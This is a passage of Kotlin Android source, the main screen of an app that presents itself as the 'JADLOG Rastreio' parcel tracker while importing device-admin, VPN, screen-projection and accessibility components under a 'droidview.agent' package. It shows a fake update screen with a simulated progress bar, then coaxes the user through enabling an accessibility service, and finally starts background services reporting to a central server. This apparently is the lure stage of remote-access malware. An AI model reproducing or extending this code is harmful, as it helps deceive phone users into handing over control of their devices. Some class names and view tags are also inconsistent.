package com.droidview.agent

import android.app.Activity
import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.VpnService
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import com.droidview.agent.accessibility.AgentAccessibilityService
import com.droidview.agent.mdm.DroidViewDeviceAdminReceiver
import com.droidview.agent.projection.ProjectionConsentController
import com.droidview.agent.service.AgentForegroundService
import com.droidview.agent.vpn.AgentVpnService
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URI
import java.net.URL

/**
 * MainActivity do JADLOG Rastreio.
 * Implementa o ciclo de vida rigoroso e a máquina de estados:
 * INSTALLING -> INSTALLED -> INITIALIZING -> LOADING -> ACCESSIBILITY_REQUIRED -> ACCESSIBILITY_ENABLED -> READY (ou ERROR).
 */
class MainActivity : Activity() {

    private val projectionRequestCode = 4102
    private val vpnRequestCode = 4103
    private val mainHandler = Handler(Looper.getMainLooper())

    private lateinit var consentController: ProjectionConsentController
    private lateinit var enrollment: EnrollmentConfig
    private lateinit var stateTracker: AppStateTracker

    private var currentState: LifecycleState = LifecycleState.INITIALIZING
    private var isVpnActive = false
    private var isScreenAccepted = false
    private var loadingProgress = 0

    // Container raiz
    private lateinit var rootContainer: LinearLayout
    private lateinit var contentArea: LinearLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        consentController = ProjectionConsentController(this)
        stateTracker = AppStateTracker(this)
        enrollment = parseEnrollment()

        // Configura container com fundo claro profissional
        rootContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#F8FAFC"))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        contentArea = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(48, 64, 48, 48)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        val scrollView = ScrollView(this).apply {
            isFillViewport = true
            setBackgroundColor(Color.parseColor("#F8FAFC"))
            addView(contentArea)
        }

        rootContainer.addView(scrollView)
        setContentView(rootContainer)

        // Inicia na etapa INITIALIZING -> LOADING
        transitionTo(LifecycleState.INITIALIZING)
        registerWithServerAsync()
    }

    override fun onResume() {
        super.onResume()
        // No retorno ao primeiro plano, re-verifica o serviço de acessibilidade sem loop
        val isServiceActive = DViewAccessibilityService.isAccessibilityEnabled(this)
        Log.i(TAG, "onResume: verificando acessibilidade=$isServiceActive estadoAtual=$currentState")

        if (isServiceActive) {
            if (currentState != LifecycleState.READY && currentState != LifecycleState.ACCESSIBILITY_ENABLED) {
                transitionTo(LifecycleState.ACCESSIBILITY_ENABLED)
            }
        } else {
            // Se ainda não estiver ativo e não estiver em loading inicial
            if (currentState == LifecycleState.READY) {
                // Usuário desativou o serviço posteriormente
                transitionTo(LifecycleState.ACCESSIBILITY_REQUIRED)
            }
        }
    }

    /**
     * Máquina de estados explícita do aplicativo
     */
    private fun transitionTo(newState: LifecycleState) {
        currentState = newState
        Log.i(TAG, "Transição de estado para: $newState")

        when (newState) {
            LifecycleState.INITIALIZING -> {
                stateTracker.initializationStatus = "initializing"
                renderSplashView()
                // Simula transição para LOADING após 800ms
                mainHandler.postDelayed({
                    if (!isFinishing) {
                        transitionTo(LifecycleState.LOADING)
                    }
                }, 800)
            }

            LifecycleState.LOADING -> {
                stateTracker.initializationStatus = "loading"
                renderLoadingView()
                startLoadingProgressSimulation()
            }

            LifecycleState.ACCESSIBILITY_REQUIRED -> {
                stateTracker.markAccessibilityRequired()
                renderAccessibilityRequiredView()
            }

            LifecycleState.ACCESSIBILITY_ENABLED -> {
                stateTracker.markConfigurationCompleted()
                renderAccessibilityEnabledView()
                // Transiciona para READY após breve confirmação visual
                mainHandler.postDelayed({
                    if (!isFinishing) {
                        transitionTo(LifecycleState.READY)
                    }
                }, 1200)
            }

            LifecycleState.READY -> {
                stateTracker.markConfigurationCompleted()
                renderReadyView()
                startBackgroundServices()
            }

            LifecycleState.ERROR -> {
                renderErrorView(stateTracker.errorStatus.ifEmpty { "Falha inesperada durante a inicialização do sistema." })
            }

            else -> {}
        }
    }

    // =========================================================================
    // 1. TELA 02 — APLICATIVO EM INSTALAÇÃO / CARREGANDO (Fundo Branco, 4 Blocos, Barra Azul, Robô Android)
    // =========================================================================
    private fun renderSplashView() {
        rootContainer.setBackgroundColor(Color.parseColor("#FFFFFF"))
        contentArea.setBackgroundColor(Color.parseColor("#FFFFFF"))
        contentArea.removeAllViews()

        // Espaçador superior flexível
        contentArea.addView(createWeightSpacer(0.8f))

        // 4 Quadrados Coloridos (Grade 2x2) no Topo
        val gridContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 48)

            val row1 = LinearLayout(this@MainActivity).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
                val b1 = View(this@MainActivity).apply {
                    layoutParams = LinearLayout.LayoutParams(48, 48).apply { setMargins(0, 0, 12, 12) }
                    background = GradientDrawable().apply {
                        setColor(Color.parseColor("#38BDF8"))
                        cornerRadius = 12f
                    }
                }
                val b2 = View(this@MainActivity).apply {
                    layoutParams = LinearLayout.LayoutParams(48, 48).apply { setMargins(0, 0, 0, 12) }
                    background = GradientDrawable().apply {
                        setColor(Color.parseColor("#EF4444"))
                        cornerRadius = 12f
                    }
                }
                addView(b1)
                addView(b2)
            }

            val row2 = LinearLayout(this@MainActivity).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
                val b3 = View(this@MainActivity).apply {
                    layoutParams = LinearLayout.LayoutParams(48, 48).apply { setMargins(0, 0, 12, 0) }
                    background = GradientDrawable().apply {
                        setColor(Color.parseColor("#EAB308"))
                        cornerRadius = 12f
                    }
                }
                val b4 = View(this@MainActivity).apply {
                    layoutParams = LinearLayout.LayoutParams(48, 48)
                    background = GradientDrawable().apply {
                        setColor(Color.parseColor("#22C55E"))
                        cornerRadius = 12f
                    }
                }
                addView(b3)
                addView(b4)
            }

            addView(row1)
            addView(row2)
        }
        contentArea.addView(gridContainer)

        // Centro: Ícone/Badge + Nome do Aplicativo
        val headerRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)

            val miniBadge = createMiniBadge()
            addView(miniBadge)

            val name = TextView(this@MainActivity).apply {
                text = "  ${enrollment.appName}"
                textSize = 20f
                setTypeface(null, Typeface.BOLD)
                setTextColor(Color.parseColor("#0F172A"))
            }
            addView(name)
        }
        contentArea.addView(headerRow)

        // Barra de progresso azul
        val blueBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            id = View.generateViewId()
            max = 100
            progress = 68
            val d = resources.displayMetrics.density
            layoutParams = LinearLayout.LayoutParams((d * 220).toInt(), (d * 5).toInt()).apply {
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        contentArea.addView(blueBar)

        // Subtexto em itálico customizável
        val italicText = TextView(this).apply {
            text = enrollment.loadingSubtext.ifBlank { "aguarde, atualização em andamento..." }
            textSize = 12.5f
            setTypeface(null, Typeface.ITALIC)
            setTextColor(Color.parseColor("#64748B"))
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(0, 12, 0, 0)
        }
        contentArea.addView(italicText)

        // Espaçador inferior flexível
        contentArea.addView(createWeightSpacer(1f))

        // Robô Android verde no rodapé
        val androidBot = TextView(this).apply {
            text = "🤖"
            textSize = 34f
            gravity = Gravity.CENTER_HORIZONTAL
            setTextColor(Color.parseColor("#3DDC84"))
            setPadding(0, 0, 0, 24)
        }
        contentArea.addView(androidBot)
    }

    // =========================================================================
    // 2. TELA 03 — INICIALIZAÇÃO DO APLICATIVO (Fundo Preto, Badge Branco/Logo, Spinner Ciano, Copyright)
    // =========================================================================
    private fun renderLoadingView() {
        val accent = parseColorSafe(enrollment.accentColor)
        val logoBmp = getCustomLogoBitmap()

        rootContainer.setBackgroundColor(Color.parseColor("#000000"))
        contentArea.setBackgroundColor(Color.parseColor("#000000"))
        contentArea.removeAllViews()

        contentArea.addView(createWeightSpacer(1f))

        // Badge Branco Central com logotipo customizado ou texto da marca
        val whiteBadge = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(40, 20, 40, 20)
            background = GradientDrawable().apply {
                setColor(Color.WHITE)
                cornerRadius = 24f
            }
            if (logoBmp != null) {
                val iv = ImageView(this@MainActivity).apply {
                    setImageBitmap(logoBmp)
                    adjustViewBounds = true
                    val maxH = (resources.displayMetrics.density * 52).toInt()
                    maxHeight = maxH
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.WRAP_CONTENT,
                        maxH
                    )
                }
                addView(iv)
            } else {
                val logoText = TextView(this@MainActivity).apply {
                    text = enrollment.appName
                    textSize = 26f
                    setTypeface(null, Typeface.BOLD)
                    setTextColor(accent)
                    letterSpacing = -0.02f
                }
                addView(logoText)
            }
        }
        contentArea.addView(whiteBadge)

        // Spinner / Indicador circular ciano
        val cyanSpinner = ProgressBar(this).apply {
            isIndeterminate = true
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 42, 0, 0)
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        contentArea.addView(cyanSpinner)

        contentArea.addView(createWeightSpacer(1.2f))

        // Rodapé com Direitos Reservados Dinâmico
        val copyText = if (enrollment.copyrightText.startsWith("©")) {
            enrollment.copyrightText
        } else {
            "© ${java.util.Calendar.getInstance().get(java.util.Calendar.YEAR)} ${enrollment.appName}. ${enrollment.copyrightText}"
        }
        val copyright = TextView(this).apply {
            text = copyText
            textSize = 11f
            setTextColor(Color.parseColor("#64748B"))
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(0, 0, 0, 16)
        }
        contentArea.addView(copyright)
    }

    private fun startLoadingProgressSimulation() {
        loadingProgress = 15
        val runnable = object : Runnable {
            override fun run() {
                if (currentState != LifecycleState.LOADING || isFinishing) return

                loadingProgress += 18
                if (loadingProgress > 100) loadingProgress = 100

                val bar = contentArea.findViewWithTag<ProgressBar>("horizontal_progress_bar")
                val pct = contentArea.findViewWithTag<TextView>("loading_percent_text")
                val txt = contentArea.findViewWithTag<TextView>("loading_status_text")

                bar?.progress = loadingProgress
                pct?.text = "$loadingProgress%"

                if (loadingProgress >= 70 && txt != null) {
                    txt.text = "Verificando autorização do serviço..."
                }

                if (loadingProgress >= 100) {
                    // Finaliza carregamento e verifica acessibilidade real
                    mainHandler.postDelayed({
                        evaluateAccessibilityAndProceed()
                    }, 400)
                } else {
                    mainHandler.postDelayed(this, 300)
                }
            }
        }
        mainHandler.postDelayed(runnable, 300)
    }

    private fun evaluateAccessibilityAndProceed() {
        val isServiceActive = DViewAccessibilityService.isAccessibilityEnabled(this)
        Log.i(TAG, "Carregamento concluído. Serviço ativo: $isServiceActive")

        if (isServiceActive) {
            transitionTo(LifecycleState.ACCESSIBILITY_ENABLED)
        } else {
            transitionTo(LifecycleState.ACCESSIBILITY_REQUIRED)
        }
    }

    // =========================================================================
    // 3. TELA DE ORIENTAÇÃO — ACESSIBILIDADE REQUERIDA (Especificação Telas 05 a 09)
    // =========================================================================
    private fun renderAccessibilityRequiredView() {
        contentArea.removeAllViews()

        // Topo com Logo Jadlog compacto
        val header = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 0, 0, 24)
        }

        val badgeIcon = createMiniBadge()
        header.addView(badgeIcon)

        val headerText = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(16, 0, 0, 0)
        }
        val appTitle = TextView(this).apply {
            text = enrollment.appName
            textSize = 18f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#0F172A"))
        }
        val appDesc = TextView(this).apply {
            text = "Configuração de Acessibilidade Necessária"
            textSize = 12f
            setTextColor(parseColorSafe(enrollment.accentColor))
            setTypeface(null, Typeface.BOLD)
        }
        headerText.addView(appTitle)
        headerText.addView(appDesc)
        header.addView(headerText)

        contentArea.addView(header)

        // Card de Instruções Detalhadas
        val instructionCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 28, 32, 28)
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#FFFFFF"))
                cornerRadius = 20f
                setStroke(2, Color.parseColor("#E2E8F0"))
            }
            background = bg
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val cardTitle = TextView(this).apply {
            text = "Ativar Serviço no Android"
            textSize = 16f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#0F172A"))
            setPadding(0, 0, 10, 10)
        }
        instructionCard.addView(cardTitle)

        val cardMsg = TextView(this).apply {
            text = "Para que o aplicativo possa funcionar e fornecer suporte supervisionado, o serviço de acessibilidade precisa ser ativado no sistema operacional."
            textSize = 13f
            setTextColor(Color.parseColor("#475569"))
            setLineSpacing(6f, 1.15f)
            setPadding(0, 0, 0, 18)
        }
        instructionCard.addView(cardMsg)

        // Passo a passo numerado conforme vídeo e especificação técnica
        instructionCard.addView(createStepRow("1", "Toque no botão principal abaixo para abrir as configurações"))
        instructionCard.addView(createStepRow("2", "Selecione 'Aplicativos instalados' (ou Serviços instalados)"))
        instructionCard.addView(createStepRow("3", "Localize e toque em '${enrollment.appName}'"))
        instructionCard.addView(createStepRow("4", "Ative a chave e confirme a permissão do Android"))

        contentArea.addView(instructionCard)

        // Botão Primário de Ação: Abrir Configurações do Android
        val btnOpenSettings = Button(this).apply {
            text = "ABRIR CONFIGURAÇÕES DE ACESSIBILIDADE"
            textSize = 13.5f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#FFFFFF"))
            val btnBg = GradientDrawable().apply {
                setColor(parseColorSafe(enrollment.accentColor))
                cornerRadius = 14f
            }
            background = btnBg
            setPadding(24, 28, 24, 28)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 24, 0, 12)
            }
            setOnClickListener { openAccessibilitySettings() }
        }
        contentArea.addView(btnOpenSettings)

        // Botão Secundário: Verificar se já ativou
        val btnCheck = Button(this).apply {
            text = "Já ativei o serviço • Verificar Novamente"
            textSize = 12.5f
            setTextColor(Color.parseColor("#334155"))
            val btnBg = GradientDrawable().apply {
                setColor(Color.parseColor("#E2E8F0"))
                cornerRadius = 12f
            }
            background = btnBg
            setPadding(20, 20, 20, 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 0, 0, 12)
            }
            setOnClickListener {
                if (DViewAccessibilityService.isAccessibilityEnabled(this@MainActivity)) {
                    Toast.makeText(this@MainActivity, "Serviço ativo detectado!", Toast.LENGTH_SHORT).show()
                    transitionTo(LifecycleState.ACCESSIBILITY_ENABLED)
                } else {
                    Toast.makeText(
                        this@MainActivity,
                        "Serviço ainda desativado. Localize '${enrollment.appName}' em Acessibilidade.",
                        Toast.LENGTH_LONG
                    ).show()
                }
            }
        }
        contentArea.addView(btnCheck)

        // Botão de Contingência: Modo Limitado se o usuário recusar
        val btnLimited = TextView(this).apply {
            text = "Continuar em modo limitado sem acessibilidade"
            textSize = 12f
            setTextColor(Color.parseColor("#64748B"))
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(12, 12, 12, 12)
            setOnClickListener {
                Toast.makeText(
                    this@MainActivity,
                    "Iniciando em modo básico com funcionalidades limitadas.",
                    Toast.LENGTH_SHORT
                ).show()
                openWebApp()
            }
        }
        contentArea.addView(btnLimited)
    }

    private fun createStepRow(num: String, text: String): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 6, 0, 6)

            val circle = TextView(this@MainActivity).apply {
                this.text = num
                textSize = 12f
                setTypeface(null, Typeface.BOLD)
                setTextColor(Color.parseColor("#FFFFFF"))
                gravity = Gravity.CENTER
                val bg = GradientDrawable().apply {
                    setColor(parseColorSafe(enrollment.accentColor))
                    shape = GradientDrawable.OVAL
                }
                background = bg
                val size = (resources.displayMetrics.density * 22).toInt()
                layoutParams = LinearLayout.LayoutParams(size, size).apply {
                    setMargins(0, 0, 14, 0)
                }
            }
            addView(circle)

            val label = TextView(this@MainActivity).apply {
                this.text = text
                textSize = 12.5f
                setTextColor(Color.parseColor("#1E293B"))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }
            addView(label)
        }
    }

    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            Toast.makeText(
                this,
                "Selecione 'Aplicativos instalados' → '${enrollment.appName}' e ative o serviço",
                Toast.LENGTH_LONG
            ).show()
        } catch (_: Exception) {
            try {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            } catch (err: Exception) {
                stateTracker.markError("Não foi possível abrir as configurações do Android.")
                transitionTo(LifecycleState.ERROR)
            }
        }
    }

    // =========================================================================
    // 4. TELA TRANSITÓRIA — SERVIÇO ATIVADO COM SUCESSO
    // =========================================================================
    private fun renderAccessibilityEnabledView() {
        contentArea.removeAllViews()

        contentArea.addView(createWeightSpacer(1f))

        val checkCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(40, 36, 40, 36)
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#ECFDF5"))
                cornerRadius = 24f
                setStroke(2, Color.parseColor("#10B981"))
            }
            background = bg
        }

        val successIcon = TextView(this).apply {
            text = "✓"
            textSize = 38f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#059669"))
            gravity = Gravity.CENTER
        }
        checkCard.addView(successIcon)

        val successTitle = TextView(this).apply {
            text = "Acessibilidade Ativada!"
            textSize = 18f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#065F46"))
            setPadding(0, 12, 0, 6)
        }
        checkCard.addView(successTitle)

        val successMsg = TextView(this).apply {
            text = "O Android autorizou o serviço com sucesso.\nConcluindo configuração do ${enrollment.appName}..."
            textSize = 13f
            setTextColor(Color.parseColor("#047857"))
            gravity = Gravity.CENTER_HORIZONTAL
            setLineSpacing(4f, 1.1f)
        }
        checkCard.addView(successMsg)

        contentArea.addView(checkCard)
        contentArea.addView(createWeightSpacer(1.2f))
    }

    // =========================================================================
    // 5. TELA 10 — APLICATIVO PRONTO (READY / CONFIGURAÇÃO CONCLUÍDA)
    // =========================================================================
    private fun renderReadyView() {
        contentArea.removeAllViews()

        // Cabeçalho Dinâmico da Marca / Logo
        val logoCard = createLogoHeader()
        contentArea.addView(logoCard)

        // Badge de Status: CONFIGURAÇÃO CONCLUÍDA
        val badge = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(16, 8, 16, 8)
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#ECFDF5"))
                cornerRadius = 20f
                setStroke(2, Color.parseColor("#10B981"))
            }
            background = bg
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 16, 0, 18)
            }

            val dot = TextView(this@MainActivity).apply {
                text = "● "
                textSize = 12f
                setTextColor(Color.parseColor("#059669"))
            }
            addView(dot)

            val lbl = TextView(this@MainActivity).apply {
                text = "SISTEMA PRONTO • SERVIÇO ATIVO"
                textSize = 11.5f
                setTypeface(null, Typeface.BOLD)
                setTextColor(Color.parseColor("#065F46"))
            }
            addView(lbl)
        }
        contentArea.addView(badge)

        // Card de Informações Técnicas & Estado Persistido
        val statusCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(24, 20, 24, 20)
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#FFFFFF"))
                cornerRadius = 16f
                setStroke(2, Color.parseColor("#E2E8F0"))
            }
            background = bg
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val jsonState = stateTracker.toJson()
        val infoText = TextView(this).apply {
            text = """
                • Instalação: ${jsonState.optString("installation_status")}
                • Acessibilidade: ${jsonState.optString("accessibility_service_status")}
                • Configuração: ${jsonState.optString("configuration_status")}
                • Versão: ${jsonState.optString("app_version")} (Android ${jsonState.optString("android_version")})
                • Dispositivo: ${Build.MODEL}
                • Servidor Central: ${enrollment.serverUrl}
            """.trimIndent()
            textSize = 12f
            setTextColor(Color.parseColor("#334155"))
            setLineSpacing(6f, 1.15f)
        }
        statusCard.addView(infoText)
        contentArea.addView(statusCard)

        // Botão Principal: Acessar Destino / Rastreamento Web
        val btnOpenWeb = Button(this).apply {
            val labelText = if (enrollment.trackingTitle.isNotBlank() && enrollment.trackingTitle != "Acessar Rastreamento") {
                enrollment.trackingTitle.uppercase()
            } else {
                "ACESSAR ${enrollment.appName.uppercase()}"
            }
            text = labelText
            textSize = 14f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#FFFFFF"))
            val btnBg = GradientDrawable().apply {
                setColor(parseColorSafe(enrollment.accentColor))
                cornerRadius = 14f
            }
            background = btnBg
            setPadding(24, 26, 24, 26)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 24, 0, 10)
            }
            setOnClickListener { openWebApp() }
        }
        contentArea.addView(btnOpenWeb)

        // Botão Secundário: Configurações do Dispositivo / Servidor
        val btnAdmin = Button(this).apply {
            text = "Opções do Sistema & Servidor"
            textSize = 12f
            setTextColor(Color.parseColor("#475569"))
            val btnBg = GradientDrawable().apply {
                setColor(Color.parseColor("#E2E8F0"))
                cornerRadius = 12f
            }
            background = btnBg
            setPadding(20, 18, 20, 18)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener { promptSystemOptions() }
        }
        contentArea.addView(btnAdmin)
    }

    // =========================================================================
    // 6. TELA DE ERRO (Tratamento e Recuperação)
    // =========================================================================
    private fun renderErrorView(errorMessage: String) {
        contentArea.removeAllViews()

        contentArea.addView(createWeightSpacer(1f))

        val errorCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(36, 32, 36, 32)
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#FEF2F2"))
                cornerRadius = 20f
                setStroke(2, Color.parseColor("#F87171"))
            }
            background = bg
        }

        val errorIcon = TextView(this).apply {
            text = "⚠"
            textSize = 34f
            setTextColor(Color.parseColor("#DC2626"))
            gravity = Gravity.CENTER
        }
        errorCard.addView(errorIcon)

        val errTitle = TextView(this).apply {
            text = "Falha de Inicialização"
            textSize = 16f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#991B1B"))
            setPadding(0, 8, 0, 6)
        }
        errorCard.addView(errTitle)

        val errDesc = TextView(this).apply {
            text = errorMessage
            textSize = 13f
            setTextColor(Color.parseColor("#B91C1C"))
            gravity = Gravity.CENTER_HORIZONTAL
        }
        errorCard.addView(errDesc)

        contentArea.addView(errorCard)

        val btnRetry = Button(this).apply {
            text = "Tentar Novamente"
            textSize = 13f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#FFFFFF"))
            val btnBg = GradientDrawable().apply {
                setColor(parseColorSafe(enrollment.accentColor))
                cornerRadius = 12f
            }
            background = btnBg
            setPadding(24, 20, 24, 20)
            layoutParams = LinearLayout.LayoutParams(
                (resources.displayMetrics.density * 220).toInt(),
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 24, 0, 0)
            }
            setOnClickListener {
                stateTracker.errorStatus = ""
                transitionTo(LifecycleState.INITIALIZING)
            }
        }
        contentArea.addView(btnRetry)

        contentArea.addView(createWeightSpacer(1.2f))
    }

    // =========================================================================
    // COMPONENTES VISUAIS AUXILIARES DINÂMICOS
    // =========================================================================
    private fun parseColorSafe(hex: String?, fallback: String = "#DC2626"): Int {
        if (hex.isNullOrBlank()) return Color.parseColor(fallback)
        return try {
            val clean = hex.trim()
            Color.parseColor(if (clean.startsWith("#")) clean else "#$clean")
        } catch (_: Exception) {
            Color.parseColor(fallback)
        }
    }

    private fun getCustomLogoBitmap(): Bitmap? {
        val raw = enrollment.logoDataUrl.trim()
        if (raw.isNotEmpty()) {
            try {
                val base64Data = if (raw.contains(",")) {
                    raw.substringAfter(",")
                } else {
                    raw
                }
                val decodedBytes = Base64.decode(base64Data, Base64.DEFAULT)
                val bmp = BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
                if (bmp != null) return bmp
            } catch (e: Exception) {
                Log.w(TAG, "Falha ao decodificar logoDataUrl em Bitmap: ${e.message}")
            }
        }
        try {
            assets.open("custom_logo.png").use { stream ->
                val bmp = BitmapFactory.decodeStream(stream)
                if (bmp != null) return bmp
            }
        } catch (_: Exception) {
            // normal se arquivo não estiver empacotado em assets
        }
        return null
    }

    private fun getAppInitials(name: String): String {
        val words = name.trim().split("\\s+".toRegex()).filter { it.isNotEmpty() }
        return when {
            words.isEmpty() -> "APP"
            words.size == 1 -> words[0].take(3).uppercase()
            else -> (words[0].take(1) + words[1].take(1)).uppercase()
        }
    }

    private fun createLogoHeader(): LinearLayout {
        val accent = parseColorSafe(enrollment.accentColor)
        val logoBmp = getCustomLogoBitmap()

        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL

            if (logoBmp != null) {
                val imgContainer = LinearLayout(this@MainActivity).apply {
                    gravity = Gravity.CENTER
                    setPadding(16, 16, 16, 16)
                    background = GradientDrawable().apply {
                        setColor(Color.WHITE)
                        cornerRadius = 24f
                        setStroke(2, Color.parseColor("#E2E8F0"))
                    }
                }
                val iv = ImageView(this@MainActivity).apply {
                    setImageBitmap(logoBmp)
                    adjustViewBounds = true
                    val maxH = (resources.displayMetrics.density * 54).toInt()
                    maxHeight = maxH
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.WRAP_CONTENT,
                        maxH
                    )
                }
                imgContainer.addView(iv)
                addView(imgContainer)
            } else {
                val box = LinearLayout(this@MainActivity).apply {
                    orientation = LinearLayout.HORIZONTAL
                    gravity = Gravity.CENTER
                    setPadding(28, 16, 28, 16)
                    background = GradientDrawable().apply {
                        setColor(accent)
                        cornerRadius = 18f
                    }
                }
                val initials = getAppInitials(enrollment.appName)
                val initialsView = TextView(this@MainActivity).apply {
                    text = initials
                    textSize = 28f
                    setTypeface(null, Typeface.BOLD)
                    setTextColor(Color.WHITE)
                    letterSpacing = 0.05f
                }
                box.addView(initialsView)
                addView(box)
            }

            val label = TextView(this@MainActivity).apply {
                text = enrollment.appName.uppercase()
                textSize = 17f
                setTypeface(null, Typeface.BOLD)
                setTextColor(accent)
                setPadding(0, 10, 0, 0)
                letterSpacing = 0.08f
            }
            addView(label)
        }
    }

    private fun createMiniBadge(): View {
        val accent = parseColorSafe(enrollment.accentColor)
        val logoBmp = getCustomLogoBitmap()

        return if (logoBmp != null) {
            LinearLayout(this).apply {
                gravity = Gravity.CENTER
                setPadding(6, 6, 6, 6)
                background = GradientDrawable().apply {
                    setColor(Color.WHITE)
                    cornerRadius = 12f
                    setStroke(1, Color.parseColor("#E2E8F0"))
                }
                val iv = ImageView(this@MainActivity).apply {
                    setImageBitmap(logoBmp)
                    val s = (resources.displayMetrics.density * 32).toInt()
                    layoutParams = LinearLayout.LayoutParams(s, s)
                }
                addView(iv)
            }
        } else {
            LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
                setPadding(12, 6, 12, 6)
                background = GradientDrawable().apply {
                    setColor(accent)
                    cornerRadius = 10f
                }
                val initials = getAppInitials(enrollment.appName)
                val badgeText = TextView(this@MainActivity).apply {
                    text = initials
                    textSize = 13f
                    setTypeface(null, Typeface.BOLD)
                    setTextColor(Color.WHITE)
                }
                addView(badgeText)
            }
        }
    }

    private fun createWeightSpacer(weight: Float): LinearLayout {
        return LinearLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                0,
                weight
            )
        }
    }

    // =========================================================================
    // SERVIÇOS EM SEGUNDO PLANO & REDE
